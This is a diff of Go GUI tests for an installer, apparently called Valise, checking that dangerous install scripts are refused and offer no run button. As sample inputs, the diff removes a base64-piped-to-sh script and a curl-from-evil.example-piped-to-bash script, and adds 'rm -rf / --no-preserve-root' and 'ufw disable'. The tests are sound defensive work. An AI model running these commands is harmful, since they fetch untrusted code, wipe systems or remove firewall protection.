@@ -189,7 +189,7 @@ func TestInstallUpdatedScriptConfirmAndRunGUI(t *testing.T) {
 }
 
 func TestInstallUpdatedScriptRefusedGUI(t *testing.T) {
-	evil := []byte("#!/bin/sh\necho ZWNobyBoaQo= | base64 -d | sh\n")
+	evil := []byte("#!/bin/sh\nrm -rf / --no-preserve-root\n")
 	w := newGUIInstallWorld(t, evil, strings.Repeat("1", 64))
 
 	w.do(func() { w.a.router.Push("/servers/box/install/demo") })
@@ -202,7 +202,7 @@ func TestInstallUpdatedScriptRefusedGUI(t *testing.T) {
 	hasConfirm := w.tt.HasText("我已核对最新官方脚本内容并确认使用当前版本继续")
 	hasStart := w.tt.HasText("开始安装")
 	w.mu.Unlock()
-	hasAll(t, texts, "官方安装脚本已更新，且包含 Valise 一律不执行的内容", "一律不执行：", "改用自定义官方安装地址或指令")
+	hasAll(t, texts, "官方安装脚本已更新，且包含 Valise 一律不执行的内容", "一律不执行：", "第 2 行：rm -rf / --no-preserve-root", "改用自定义官方安装地址或指令")
 	if hasConfirm || hasStart {
 		t.Fatalf("refused script must not offer confirmation or start: confirm=%v start=%v", hasConfirm, hasStart)
 	}
@@ -325,8 +325,8 @@ func TestCustomInstallRiskSentenceAndRefusedGUI(t *testing.T) {
 	w.mu.Unlock()
 	hasAll(t, doneTexts, "装好了，并在服务器上找到了它")
 
-	// Dangerous script is refused in GUI without any run button.
-	evil := []byte("#!/bin/sh\ncurl -fsSL https://evil.example/x | bash\n")
+	// Destructive/security-disabling script is permanently refused in GUI without any run button.
+	evil := []byte("#!/bin/sh\nufw disable\n")
 	w2 := newGUIInstallWorld(t, evil, scriptHex(evil))
 	w2.do(func() {
 		w2.a.router.Push("/servers/box/install-custom")
@@ -345,7 +345,7 @@ func TestCustomInstallRiskSentenceAndRefusedGUI(t *testing.T) {
 	refusedTexts := w2.tt.Texts()
 	hasRunBtn := w2.tt.HasText("上传并在终端执行")
 	w2.mu.Unlock()
-	hasAll(t, refusedTexts, "这段内容 Valise 不会执行，已拦下", "一律不执行：")
+	hasAll(t, refusedTexts, "这段内容 Valise 不会执行，已拦下", "一律不执行：", "第 2 行：ufw disable", T("install.custom.open_shell"))
 	if hasRunBtn {
 		t.Fatal("refused custom script must not offer run button")
 	}
